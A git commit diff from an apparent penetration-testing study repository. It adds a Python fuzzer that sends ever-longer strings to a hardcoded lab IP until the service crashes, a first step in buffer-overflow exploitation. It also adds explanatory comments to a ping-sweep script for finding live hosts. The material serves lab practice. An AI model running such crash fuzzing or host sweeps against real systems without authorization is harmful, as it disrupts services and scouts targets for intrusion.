94b3cf8d71bd42c4f35a40305aa6bd91be6a587e
ryuparish <ryuparish@ryuparish.attlocal.net>
2021-08-12 00:36:26 -0400

    Added some more notes

---
+++ BOFscripts/fuzzer.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.221.180"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+total_times = 0
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    print("Sent {} times then crashed right after".format(total_times))
+    sys.exit(0)
+  string += 100 * "A"
+  total_times += 1
+  time.sleep(1)
--- tools/scripts/ipsweep.sh
+++ tools/scripts/ipsweep.sh
@@ -7,7 +7,10 @@ echo "Syntax: ./ipsweep.sh 192.168.1"
 
 else
   for ip in `seq 1 254`; do
-    ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
+    ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & #This ampersand here will allow multiple threads to work multiple iterations for faster completion
   done
 fi
 
+# Turn this into an executable with chmod +x ipsweep.sh and then you can 
+# also pipe the output by doing: ./ipsweep.sh 192.168.4 > ips.txt into a file that you can then 
+# cat and see the ips in the network that can be pinged.
